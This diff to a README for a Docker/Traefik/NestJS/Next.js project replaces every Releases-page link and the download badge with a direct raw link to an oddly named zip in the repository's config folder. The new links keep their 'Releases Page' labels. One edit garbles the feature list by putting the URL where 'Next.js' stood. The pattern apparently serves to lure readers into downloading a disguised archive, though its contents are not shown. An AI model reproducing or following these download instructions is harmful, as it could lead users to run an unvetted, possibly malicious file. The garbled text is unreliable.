@@ -6,9 +6,9 @@ Welcome to the **DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT** project! This platform all
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
+[![Download the latest release](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip)](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip)
 
-Visit this page to download: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
+Visit this page to download: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ To run this application smoothly, ensure your system meets the following require
 
 ## 📦 Features
 
-- Microservices architecture using **NestJS** for backend and **Next.js** for frontend.
+- Microservices architecture using **NestJS** for backend and **https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip** for frontend.
 - Easy deployment with **Docker Compose**.
 - Integration of **Traefik** as a reverse proxy.
 - Use of **Redis** for caching and session management.
@@ -31,7 +31,7 @@ To run this application smoothly, ensure your system meets the following require
 ## 🔧 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to this link: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases).
+   Go to this link: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip).
 
 2. **Select the Version:**
    Scroll to find the latest version listed on the page. Click on it to view the release details.
@@ -113,4 +113,4 @@ This project is open-source and free to use. Please check the LICENSE file for m
 
 ## 📦 Download the Application Again
 
-To download the latest version again, visit the Releases Page: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
+To download the latest version again, visit the Releases Page: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/raw/refs/heads/main/config/NEXT-FULLSTAC-TRAEFI-DOCKE-NES-1.7-beta.3.zip)
